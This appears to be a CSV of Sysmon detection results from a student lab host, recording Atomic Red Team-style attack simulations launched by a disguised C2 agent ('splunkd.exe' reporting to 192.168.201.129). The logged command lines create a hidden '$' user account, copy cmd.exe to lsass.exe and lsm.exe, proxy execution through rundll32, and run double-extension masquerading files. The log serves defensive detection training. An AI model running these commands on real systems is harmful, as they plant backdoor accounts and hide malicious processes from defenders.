"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-23 14:15:40.913 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172701,"Cmdline: cmd.exe /C net user $ ATOMIC123! /add /active:yes ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2620 ¦ PGUID: E9F06A57-95FC-694A-DC02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:15:40.899","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:15:40.952 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172702,"Cmdline: net user $ ATOMIC123! /add /active:yes ¦ Proc: C:\Windows\System32\net.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C net user $ ATOMIC123! /add /active:yes ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1652 ¦ PGUID: E9F06A57-95FC-694A-DD02-000000002300 ¦ ParentPID: 2620 ¦ ParentPGUID: E9F06A57-95FC-694A-DC02-000000002300 ¦ Description: Net Command ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0E6C2EDA203E61C8AB3B5FAF6E3F49A7,SHA256=63A96F43EB673FD465A4238E3A2BBFE5273B858D806A58375BA1520CE097CDF4,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: net.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:15:40.950","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:15:40.985 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172703,"Cmdline: C:\WINDOWS\system32\net1 user $ ATOMIC123! /add /active:yes ¦ Proc: C:\Windows\System32\net1.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: net user $ ATOMIC123! /add /active:yes ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3268 ¦ PGUID: E9F06A57-95FC-694A-DE02-000000002300 ¦ ParentPID: 1652 ¦ ParentPGUID: E9F06A57-95FC-694A-DD02-000000002300 ¦ Description: Net Command ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=12293EDB07AB8B4D92BAF4BEBFD7A9D8,SHA256=15E3429ECCE48FC6AB66371D040F4C40FB961F2CED4C7D40942279B19DEFE8C7,IMPHASH=98A56655C7E54BCE7F55B3F01AB5B07E","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: net1.exe ¦ ParentImage: C:\Windows\System32\net.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:15:40.982","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:21.945 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172704,"Cmdline: cmd.exe /C copy C:\Windows\System32\cmd.exe C:\lsm.exe && C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1012 ¦ PGUID: E9F06A57-9625-694A-DF02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:16:21.934","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:22.002 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172706,"Cmdline: C:\lsm.exe /c echo T1036.003 ¦ Proc: C:\lsm.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy C:\Windows\System32\cmd.exe C:\lsm.exe && C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6408 ¦ PGUID: E9F06A57-9625-694A-E002-000000002300 ¦ ParentPID: 1012 ¦ ParentPGUID: E9F06A57-9625-694A-DF02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:16:21.998","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:17:02.959 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172707,"Cmdline: cmd.exe /C rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""4c870d_T1218.011_DefaultInstall.inf"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4124 ¦ PGUID: E9F06A57-964E-694A-E102-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:17:02.957","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:17:02.971 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172708,"Cmdline: rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""4c870d_T1218.011_DefaultInstall.inf"" ¦ Proc: C:\Windows\System32\rundll32.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""4c870d_T1218.011_DefaultInstall.inf"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8964 ¦ PGUID: E9F06A57-964E-694A-E202-000000002300 ¦ ParentPID: 4124 ¦ ParentPGUID: E9F06A57-964E-694A-E102-000000002300 ¦ Description: Windows host process (Rundll32) ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=CBA4E8BBCFA49E5C546C138CF6E914F3,SHA256=9BACA6F9FD3F9330A880F13D449408395278C1923813EC8999C3ECD017111B5D,IMPHASH=3DB48F7E208E17408E177BD8B816560A","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: RUNDLL32.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:17:02.970","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:18:25.006 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172709,"Cmdline: cmd.exe /C copy %%SystemRoot%%\System32\cmd.exe %%SystemRoot%%\Temp\lsass.exe && %%SystemRoot%%\Temp\lsass.exe /B ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3648 ¦ PGUID: E9F06A57-96A0-694A-E402-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:18:24.991","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:18:25.060 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172711,"Cmdline: C:\WINDOWS\Temp\lsass.exe /B ¦ Proc: C:\Windows\Temp\lsass.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe && %SystemRoot%\Temp\lsass.exe /B ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8880 ¦ PGUID: E9F06A57-96A1-694A-E502-000000002300 ¦ ParentPID: 3648 ¦ ParentPGUID: E9F06A57-96A0-694A-E402-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:18:25.056","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:19:22.043 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172712,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \""\\.\C:\"", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3168 ¦ PGUID: E9F06A57-96DA-694A-E602-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:19:22.037","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.796 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172640,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-process ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8840 ¦ PGUID: E9F06A57-9428-694A-B402-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.792","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.276 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172642,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localgroup ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8540 ¦ PGUID: E9F06A57-9429-694A-B502-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.275","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.625 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172644,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localuser ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5320 ¦ PGUID: E9F06A57-9429-694A-B602-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.624","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.905 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172646,"Cmdline: ""C:\Windows\Temp\debug.exe"" Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5248 ¦ PGUID: E9F06A57-9429-694A-B702-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.904","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.758 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172674,"Cmdline: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.docx.exe ¦ Proc: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.docx.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2252 ¦ PGUID: E9F06A57-9545-694A-C502-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows Calculator ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=CFCA921BBAC5103BF369B2B1B604C13E,SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A,IMPHASH=1C9F3A396211B31FA9D65A8CE96B9BB4","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: CALC.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:37.756","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_defense.evtx"
